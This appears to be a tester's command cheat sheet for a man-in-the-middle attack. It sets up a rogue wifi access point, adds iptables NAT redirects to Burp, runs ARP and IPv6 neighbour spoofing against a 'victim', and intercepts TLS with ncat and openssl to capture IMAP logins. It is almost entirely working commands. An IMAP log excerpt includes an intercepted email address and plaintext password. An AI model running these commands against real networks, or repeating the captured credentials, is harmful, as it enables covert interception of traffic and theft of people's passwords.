# basics (put in a wifi stick and set up an access point
pamcan -S hostapd dnsmasq
cp hostapd.conf /etc/hostapd/hostapd.conf
cp dnsmasq.conf /etc/dnsmasq.conf

ip a add 10.10.0.1/24 dev wlan0
hostapd hostapd.conf
dnsmasq --test # syntax check
systemctl start dnsmasq

#### enable routing
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1

### don't tell the victim: there is a faster route
sysctl -w net.ipv4.conf.all.send_redirects=0


# firewall redirects
iptables -t nat -F PREROUTING
ip6tables -t nat -F PREROUTING

##### burp must listen on 0.0.0.0 (127.0.0.1 is not enough; todo: try  -j DNAT --to-destination 127.0.0.1:xxxx)
iptables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 993 -j REDIRECT --to-port 993
\#iptables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 993 -j DNAT --to-destination 127.0.0.1:993

##### burp must listen on :: (::1 is not enough)
ip6tables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 80 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 443 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 993 -j REDIRECT --to-port 993
\#ip6tables -t nat -A PREROUTING -i wlp3s0 -p tcp --dport 993 -j DNAT --to-destination ::1:993


# if you are not the router: arp spoof
#### v4
sudo arpspoof -i <interface> -c both -t <victim> <router>
sudo arpspoof -i <interface> -c both -t <router> <victim>

#### v6
get default ip: ip -6 route get ::
sudo fake_advertise6 -r -w 2 wlp3s0 <fe80::of::gateway>

kmille@linbox hacktheworld% pacman -Qo /usr/bin/fake_advertise6
/usr/bin/fake_advertise6 is owned by thc-ipv6 3.6-1


### Debugging
install and use termux on the android phone
    - watch ip n or watch arp -n
    - curl -4 heise.de
    - curl -6 heise.de
install and use termux on the android phone
Wireshark filter on attacking machine:
    - ip.addr == $(dig -short heise.de ) or ipv6.addr == $(dig -short heise.de aaaa)

#### Imap
- Burp/mitmproxy only support http
- you can do it with netcat
    - http: sudo ncat --ssl --ssl-cert server.crt --ssl-key server.key --sh-exec "openssl s_client -quiet -connect heise.de:443 | tee -a ncat.log" -kl 127.0.0.1 443
    - imap: sudo ncat -o ncat2.log --ssl --ssl-cert server.crt --ssl-key server.key --sh-exec "openssl s_client -quiet -connect upstream-mailserver:993" -kl :: 993
    - ncat2.log will contain the IMAP commands (including the password)
    5 OK Search completed (0.001 + 0.000 secs).
6 UID FETCH 2,1 (UID FLAGS)
* 1 FETCH (UID 1 FLAGS (\Answered \Seen junk))
* 2 FETCH (UID 2 FLAGS (\Seen junk))
6 OK Fetch completed (0.001 + 0.000 secs).
1 NO [AUTHENTICATIONFAILED] Authentication failed.
1 NO [AUTHENTICATIONFAILED] Authentication failed.
2 LOGIN "mail@androidloves.me" "tifhddjfu"
2 LOGIN "mail@androidloves.me" "tifhddjfu"
7 NOOP
7 OK NOOP completed (0.001 + 0.000 secs).
8 EXAMINE "Archives.2018"
* OK [CLOSED] Previous mailbox closed.
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft nonjunk)
* OK [PERMANENTFLAGS ()] Read-only mailbox.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1484765072] UIDs valid
* OK [UIDNEXT 4] Predicted next UID
8 OK [READ-ONLY] Examine completed (0.000 + 0.000 secs).
9 UID SEARCH 1:1 NOT DELETED



# TODO
 - read this carefully: https://security.stackexchange.com/questions/33374/whats-an-easy-way-to-perform-a-man-in-the-middle-attack-on-ssl
 - Understand this fifo magic which does not work for me now
    - mkfifo request response
    - openssl s_server -quiet -no_ssl2 -cipher AES128-SHA  -accept 443 -cert fake.crt -key fake.key  < response | tee -a request
    - openssl s_client -quiet -connect www.server.com:443 < request  | tee -a response
- checkout https://www.stunnel.org/
- and https://github.com/jrmdev/mitm_relay


